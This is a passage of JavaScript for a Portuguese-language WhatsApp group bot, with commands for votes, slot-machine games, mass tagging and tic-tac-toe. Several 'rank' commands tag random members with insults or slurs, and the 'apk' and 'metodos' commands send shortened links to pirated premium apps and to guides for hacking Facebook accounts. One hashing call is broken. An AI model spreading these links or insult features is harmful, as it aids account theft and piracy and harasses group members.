‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
`



tomioka.sendMessage(from, kentod, MessageType.text, {quoted: tomio, contextInfo: tome})

break
//___________VOTA√áAO/VOTAR____________//
case 'delvote':

if(isvoting) return enviar('Sem sess√£o de vota√ß√£o')                  
delvote(delvote)
enviar('Sess√£o de vota√ß√£o exclu√≠da com sucesso neste grupo')
break
case 'vote':
if(!isGroup) return 
if (isVote) return enviar('ja tem uma vota√ßao ativa')
if(!q) return enviar('*Vota√ßao*\n\n'+ prefix+ 'vote @tag target | motivo | 1 (1 = 1 Minuto)')
if (msg.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || msg.message.extendedTextMessage.contextInfo == null) {
let id = msg.message.extendedTextMessage.contextInfo.mentionedJid[0]
split = args.join(' ').replace('@', '').split('|')
if(!Number(split[2])) return enviar('insira um numero no parametro 3\nNumera√ßao: 1-9999\n1 = 1 Minutos')
await mentions('Vote ' +'@'+ id.split('@')[0]+ '\n\n' + 'como fazer:' +'\n\n' + `votar = ‚úÖ\ndevote = ‚ùå\n\nmotivo: ${split[1]}`,[id],true)
addVote(from,split[1],split[0],split[2],enviar)
let temporalF= tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "‚úÖVOTA√á√ÉO‚úÖ",
"description": "clique nos bot√µes abaixo e envie",
"buttonText": "VOTAR",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'SIM',
"rowId": ''
},
{
"title": 'N√ÉO',
"rowId": ''
}
]
}
]                    
}
}, {quoted:tomioka})
tomioka.relayWAMessage(temporalF)}
break
//figurinha menu stiker cmd stickercmd
case 'hash': 
if (!isOwner) return enviar ('*Este comando s√≥ pode ser usado pelo o dono!* ')
if (!isQuotedSticker) return enviar("Marque um sticker")
const encmeds9 = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const mediastick = await tomioka.downloadMediaMessage(encmeds9)
var crypto = require('crypto')
hash = crypto.createStickerHash('sha256').update(mediastick).digest('base64');
console.log(hash)
enviar(hash)
break
case 'addcmd': 
case 'setcmd':
if (!isOwner && !msg.key.fromMe) return enviar('```so dono```')
if (isQuotedSticker) {
var kodenya = msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
enviar("```[ ‚úì ]``` pronto")
} else {
enviar('Responder o sticker')
}
break
case 'delcmd':
if (!isOwner && !msg.key.fromMe) return enviar('```so dono```')
var kodenya = msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
enviar("```[ ‚úì ]``` pronto")
break
case 'listcmd':
let teksnyee = `\`\`\`„Äå LIST STICKER CMD „Äç\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n‚û∏ *ID :* ${i.id}\n‚û∏ *Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
case 'apk1':
enviar (`üì±‚ù§·•Äüî•COMO SABER SE SUA NAMORADA EST√Å TE TRAINDO COM ESSE APLICATIVO ANDROID [APK] [2021] [DOWNLOAD]üì±‚ù§·•Äüî•\n\nhttps://seulink.online/9Jqr`)
break
case 'apk2':
enviar (`·•Äüî•‡æç÷ü·•ÄNOVO SPOTIFY PREMIUM + MOD v8.5.45 + LITE [2021] [APK] [MOD] [DOWNLOAD]·•Äüî•‡æç÷ü·•Ä\n\nhttps://seulink.online/cHi6ezMz`)
break
case 'apk3':
enviar (`·•Äüî•‡æç÷üNETFLIX GR√ÅTIS APK MOD - NOVA ATUALIZA√á√ÉO 2021!! - ASSISTA TUDO ONDE ESTIVER ! [APK] [MOD] [DOWNLOAD]·•Äüî•‡æç÷ü\n\nhttps://seulink.online/3NSniiHO`)
break
case 'apk4':
enviar (`üî•LISTA DE APK's E JOGOS PREMIUM/PRO/MOD 100% GR√ÅTIS LISTA 02! [2021]·•Äüî•\n\nNOVO RESSO PREMIUM ATUALIZADO:\nhttps://seulink.online/FgSOHnxj9r\n\nYOUTUBE VANCED APK:\nhttps://seulink.online/St1OGAI\n\nSNAPTUBE PREMIUM:\nhttps://seulink.online/ITdCU\n\nKINE MASTER PREMIUM:\nhttps://seulink.online/IfmC74cv5D\n\nCHUNCHYOLL PREMIUM V3.7.0:\nhttps://seulink.online/BrpZ\n\nYOUTUBE MUSIC PREMIUM APK:\nhttps://seulink.online/LQHFAcs7T\n\nNOVO RESSO PREMIUM ATUALIZADO:\nhttps://seulink.online/FgSOHnxj9r\n\nYOUTUBE VANCED APK:\nhttps://seulink.online/St1OGAI\n\nSNAPTUBE PREMIUM:\nhttps://seulink.online/ITdCU\n\nKINE MASTER PREMIUM:\nhttps://seulink.online/IfmC74cv5D\n\nCHUNCHYOLL PREMIUM V3.7.0:\nhttps://seulink.online/BrpZ\n\nCAPCUT MOD:\nhttps://seulink.online/NeU1\n\nFOGO LIVRE GRATUITO (MAX):\nhttps://seulink.online/zwjnrznO\n\nCLANS OF CLANS MOD:\nhttps://seulink.online/fuTSyasis`)
break
case 'apk5':
enviar (`üî•‡æç÷üVIZER 4.5 !!! - APP P/ ASSISTIR FILMES E SERIES , ANIMES E MUITO MAIS!üî•\n\nhttps://seulink.online/WvkgLwc`)
break
case 'metodos':
enviar (`·•Äüî•V√ÅRIOS M√âTODOS PARA HACKEAR CONTAS NO FACEBOOK SEM MUITO ESFOR√áO !!!·•Äüî•\n\nV√°rios m√©todos para voc√™ aprender a hackear facebook utilizando at√© alguns truques simples e um pouco de engenharia social e voc√™ ter√° acesso a conta que voc√™ quiser esses m√©todos s√£o gringos e foram traduzidos para portugu√™s.\n\n‡Æì‡ØÄ·§¢‚úßüî•COMO HACKEAR UMA CONTA NO FACEBOOK SEM NENHUM TIPO DE CONHECIMENTO HACKER·•Äüî•:\nhttps://seulink.online/8nUFM5Kndg\n\n‡Æì‡ØÄ·§¢‚úßüî•COMO MUDAR A APARENCIA DO SEU FACEBOOK·•Äüî•:\nhttps://seulink.online/gS0ALJ\n\n‡Æì‡ØÄ·§¢‚úßüî•COMO RECUPERAR MENSAGENS EXCLUIDAS DO SEU FACEBOOK·•Äüî•:\nhttps://seulink.online/D6M6aKG\n\n‡Æì‡ØÄ·§¢‚úßüî•COMO ENVIAR PEDIDOS DE AMIZADES PARA AMIGOS QUE TE BLOQUEARAM NO FACEBOOK·•Äüî•:\nhttps://seulink.online/tlL6\n\n‡Æì‡ØÄ·§¢‚úßüî•COMO ENVIAR SMS PELO FACEBOOK·•Äüî•:\nhttps://seulink.online/s0K7b0fr\n\n‡Æì‡ØÄ·§¢‚úßüî•COMO HACKEAR UM FACEBOOK APENAS COM UM SMS·•Äüî•:\nhttps://seulink.online/x2R4ztr\n\n‡Æì‡ØÄ·§¢‚úßüî•V√ÅRIOS M√âTODOS PARA HACKEAR CONTAS NO FACEBOOK·•Äüî•:\nhttps://seulink.online/FP1zrCb`)
break
case 'suruba':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'chamando vcs para uma surubinha\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `‚ù§Ô∏è‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'surubao':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'ü§§ü§§chamando vcs para um surubaoü§§ü§§\n'
for(i = 0; i < 10; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `üòç‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
//_RANKS 
case 'rankgado':
try{
if(!isGroup) return ('s√≥ grupo')
d = []
teks = 'üêÉRank dos mais gados\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `üêÉ‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankgay':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'üè≥Ô∏è‚Äçüåà Rank dos mais gaysüè≥Ô∏è‚Äçüåà\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `üè≥Ô∏è‚Äçüåà‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankiludidos':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'üåù Rank dos mais iludidos do grupoüåù\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `üåù‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankcornos':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'üòéRank dos mais cornos do grupoüòé\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `üòé‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankloucos':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'ü§°Rank dos mais loucos do grupoü§°\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `ü§°‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankalfa':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'üê∫ Rank dos alfas do grupoüê∫\n'
for(i = 0; i < 4; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `üê∫‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'ranknazista':
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'üíÇ‚Äç‚ôÇÔ∏èRank dos mais nazistas\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `üíÇ‚Äç‚ôÇÔ∏è‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankbeta':
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'ü§ìRank dos mais beta\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `??‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankcaco':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('s√≥ grupo')
d = []
teks = 'üêí Rank dos camacos do grupoüêí\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `Ô∏è‚Äçüêí‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'ranklindos':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return ('s√≥ grupo')
d = []
teks = 'ü§©Rank dos mais lindos do grupoü§©\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `ü§©‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankfeios':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return ('s√≥ grupo')
d = []
teks = 'ü§¢Rank dos mais feios do grupoü§¢\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `ü§¢‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankprincesas':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return ('s√≥ grupo')
d = []
teks = 'üë∏üèªRank das princesas do grupoüë∏üèª\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `üë∏üèª‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankprincipes':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return ('s√≥ grupo')
d = []
teks = 'ü§¥üèªRank dos principes do grupoü§¥üèª\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `ü§¥üèª‚ùß @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break 
//_CASSINOS 
case 'cassino':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
const cassino = ['„Ö§\n*‚ïî‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*\n*‚ïë*\n*‚ïë*\n*‚ï†* ROLETA DOS TR√äS\n*‚ï†* N√öMEROS\n*‚ïë*\n*‚ï†‚ïê‚îÄ 1 ‚îÄ‚ïê‚îÄ 2 ‚îÄ‚ïê‚îÄ 3*\n*‚ïë*\n*‚ïë*\n*‚ï†* N√£o foi dessa vez mas\n*‚ïë* continue tentando.\n*‚ïë*\n*‚ïö‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*','„Ö§\n*‚ïî‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*\n*‚ïë*\n*‚ïë*\n*‚ï†* ROLETA DOS TR√äS\n*‚ï†* N√öMEROS\n*‚ïë*\n*‚ï†‚ïê‚îÄ 2 ‚îÄ‚ïê‚îÄ 3 ‚îÄ‚ïê‚îÄ 1*\n*‚ïë*\n*‚ïë*\n*‚ï†* N√£o foi dessa vez mas\n*‚ïë* continue tentando.\n*‚ïë*\n*‚ïö‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*','„Ö§\n*‚ïî‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*\n*‚ïë*\n*‚ïë*\n*‚ï†* ROLETA DOS TR√äS\n*‚ï†* N√öMEROS\n*‚ïë*\n*‚ï†‚ïê‚îÄ 3 ‚îÄ‚ïê‚îÄ 2 ‚îÄ‚ïê‚îÄ 1*\n*‚ïë*\n*‚ïë*\n*‚ï†* N√£o foi dessa vez mas\n*‚ïë* continue tentando.\n*‚ïë*\n*‚ïö‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*','„Ö§\n*‚ïî‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*\n*‚ïë*\n*‚ïë*\n*‚ï†* ROLETA DOS TR√äS\n*‚ï†* N√öMEROS\n*‚ïë*\n*‚ï†‚ïê‚îÄ 1 ‚îÄ‚ïê‚îÄ 3 ‚îÄ‚ïê‚îÄ 2*\n*‚ïë*\n*‚ïë*\n*‚ï†* N√£o foi dessa vez mas\n*‚ïë* continue tentando.\n*‚ïë*\n*‚ïö‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*','„Ö§\n*‚ïî‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*\n*‚ïë*\n*‚ïë*\n*‚ï†* ROLETA DOS TR√äS\n*‚ï†* N√öMEROS\n*‚ïë*\n*‚ï†‚ïê‚îÄ 2 ‚îÄ‚ïê‚îÄ 1 ‚îÄ‚ïê‚îÄ 3*\n*‚ïë*\n*‚ïë*\n*‚ï†* N√£o foi dessa vez mas\n*‚ïë* continue tentando.\n*‚ïë*\n*‚ïö‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*','„Ö§\n*‚ïî‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*\n*‚ïë*\n*‚ïë*\n*‚ï†* ROLETA DOS TR√äS\n*‚ï†* N√öMEROS\n*‚ïë*\n*‚ï†‚ïê‚îÄ 3 ‚îÄ‚ïê‚îÄ 1 ‚îÄ‚ïê‚îÄ 2*\n*‚ïë*\n*‚ïë*\n*‚ï†* N√£o foi dessa vez mas\n*‚ïë* continue tentando.\n*‚ïë*\n*‚ïö‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*','„Ö§\n*‚ïî‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*\n*‚ïë*\n*‚ïë*\n*‚ï†* ROLETA DOS TR√äS\n*‚ï†* N√öMEROS\n*‚ïë*\n*‚ï†‚ïê‚îÄ 1 ‚îÄ‚ïê‚îÄ 1 ‚îÄ‚ïê‚îÄ 1*\n*‚ïë*\n*‚ïë*\n*‚ï†* PARAB√âNS !!!\n*‚ï†* VOC√ä GANHOU NO CASSINO.\n*‚ïë*\n*‚ïö‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*','„Ö§\n*‚ïî‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*\n*‚ïë*\n*‚ïë*\n*‚ï†* ROLETA DOS TR√äS\n*‚ï†* N√öMEROS\n*‚ïë*\n*‚ï†‚ïê‚îÄ 2 ‚îÄ‚ïê‚îÄ 2 ‚îÄ‚ïê‚îÄ 2*\n*‚ïë*\n*‚ïë*\n*‚ï†* PARAB√âNS !!!\n*‚ï†* VOC√ä GANHOU NO CASSINO.\n*‚ïë*\n*‚ïö‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*','„Ö§\n*‚ïî‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*\n*‚ïë*\n*‚ïë*\n*‚ï†* ROLETA DOS TR√äS\n*‚ï†* N√öMEROS\n*‚ïë*\n*‚ï†‚ïê‚îÄ 3 ‚îÄ‚ïê‚îÄ 3 ‚îÄ‚ïê‚îÄ 3*\n*‚ïë*\n*‚ïë*\n*‚ï†* PARAB√âNS !!!\n*‚ï†* VOC√ä GANHOU NO CASSINO.\n*‚ïë*\n*‚ïö‚ïê‚îÄ CASSINO ‚îÄ‚ïê‚ïê*']
random = cassino[Math.floor(Math.random() * (cassino.length))]
enviar(`${random}`)
break
case 'cassino1':
if (!isGroup) return enviar ('s√≥ grupo')
let cassinao = ['üçâ', 'üçé','üçá']
let resposta1 = cassinao[Math.floor(Math.random() * cassinao.length)]
let resposta2 = cassinao[Math.floor(Math.random() * cassinao.length)]
let resposta3 = cassinao[Math.floor(Math.random() * cassinao.length)]
if(resposta1==resposta2&&resposta2==resposta3){
tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Parab√©ns, _${pushname}_ VOC√ä GANHOU*!!!!!`, text, {quoted: msg})
}
else if(resposta1==resposta2||resposta2==resposta3){
tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Puts, passou perto, _${pushname}_ Quase foi...*`, text, {quoted: msg})
}
else{
tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*vc perdeu :( , _${pushname}_ Tente na pr√≥xima...*`, text, {quoted: msg})
}
break
case 'cassino2':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
const sotoy = [
'üçä : üçí : üçê',
'üçí : üîî : üçä',
'üçá : üçá : üçá',
'üçä : üçã : üîî',
'üîî : üçí : üçê',
'üîî : üçí : ??',
'üçä : üçã : üîî',		
'üçê : üçí : üçã',
'üçê : üçê : üçê',
'üçä : üçí : üçí',
'üîî : üîî : üçá',
'üçå : üçí : üîî',
'üçê : üîî : üîî',
'üçä : üçã : üçí',
'üçã : üçã : üçå',
'üîî : üîî : üçá',
'üîî : üçê : üçá',
'üîî : üîî : üîî',
'üçí : üçí : üçí',
'üçå : üçå : üçå'
]
const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
yow = `[  üé∞ | SLOTS ]\n-----------------\nüçã : üçå : üçç\n${somtoy}<=====\nüçã : üçå : üçç\n[  üé∞ | SLOTS ]\n\nInforma√ßoes : Se voc√™ pegar 3 iguais significa que voc√™ ganhou\n\nExemplo : üçå : üçå : üçå<=====`
enviar(yow)
break
case 'casino': 
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
var roletaresu = [`üçíüçÖüçá`, `üçÖüçáüçí`, `üçáüçÖüçá`, `üçíüçíüçá`, `üçáüçáüçí`, `üçÖüçÖüçá`, `üçáüçíüçí`]
var roletaresu2 = [`üçíüçÖüçá`, `üçÖüçáüçí`, `üçáüçÖüçá`, `üçíüçíüçá`, `üçá??üçí`, `üçíüçÖüçá`, `üçÖüçáüçí`, `üçáüçÖüçá`, `üçíüçíüçá`, `üçáüçáüçí`, `üçíüçÖüçá`, `üçÖüçáüçí`, `üçáüçÖüçá`, `üçíüçíüçá`, `üçáüçáüçí`, `üçíüçíüçí`, `üçáüçáüçá`,  `üçÖüçÖüçÖ`, `üçÖüçÖ??`, `üçáüçíüçí`, `üçíüçáüçá`]
var roletaresu3 = [`üçíüçÖüçá`, `üçÖüçáüçí`, `üçáüçÖüçá`, `üçíüçíüçá`, `üçáüçáüçí`, `üçÖüçÖüçá`, `üçáüçíüçí`, `üçáüçíüçí`, `üçíüçáüçá`]
const roleta1 = roletaresu[Math.floor(Math.random() * roletaresu.length)]
const roleta2 = roletaresu2[Math.floor(Math.random() * roletaresu2.length)]
const roleta3 = roletaresu3[Math.floor(Math.random() * roletaresu3.length)]
teksahh = `*Roleta Giradaüé∞??*\nlhe desejo sorte\n\n${roleta1}\n${roleta2}\n${roleta3}`
tomioka.sendMessage(from, teksahh, text, {quoted: msg})

break
case 'figutag':
case 'totag':
if (!isPremium) return enviar ('s√≥ premium')

if ((isMedia && !msg.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else {
enviar(`*[‚ùó] MARQUE A FIGURINHA üòê*`)
}
break

case 'supertag':
if (!isPremium) return enviar ('s√≥ premium')

if ((isMedia && !msg.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, image, options)
fs.unlinkSync(file)
} else if ((isMedia && !msg.message.videoMessage || isQuotedAudio) && args.length == 0) {
encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'audio/mp4',
ptt : true,
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, audio, options)
fs.unlinkSync(file)
}  else if ((isMedia && !msg.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/mp4',
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else{
enviar(`[‚ùó] responder imagem/adesivo/√°udio/v√≠deo com a legenda ${p}supertag para marcar`)
}
break
/*-------------[ Tictactoe Handler ]-------------*/
case 'velha':
if (!isUser) return enviar('usuario nao registrado')                                 
if(!isGroup) return enviar('comando apenas para grupos')
if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*üéÆ·èÄÃ∏·é™Ã∏·é∑Ã∏·é¨Ã∏ ·é†Ã∏·é™Ã∏ ·èôÃ∏·é¨Ã∏·èûÃ∏·éªÃ∏·é™Ã∏üïπÔ∏è*

[‚ùó] Algu√©m est√° jogando no momento...\n\n@${boardnow.X} VS @${boardnow.O}

‚ùå : @${boardnow.X}
‚≠ï : @${boardnow.O}

Sua vez : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}


${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


`;
tomioka.sendMessage(from, chatMove, MessageType.text, {
quoted: tomio, contextInfo: tome,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return enviar(
`*‚üÖ‚ùó‚üÜ Jogue com Alghem!!!!*
*para inicar a partida : ${p + command} @membro do gp*`
);
const boardnow = setGame(`${from}`);
console.log(`Start Tictactore ${boardnow.session}`);
boardnow.status = false;
boardnow.X = sender.replace("@s.whatsapp.net", "");
boardnow.O = argss[1].replace("@", "");
fs.writeFileSync(
`./lib/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
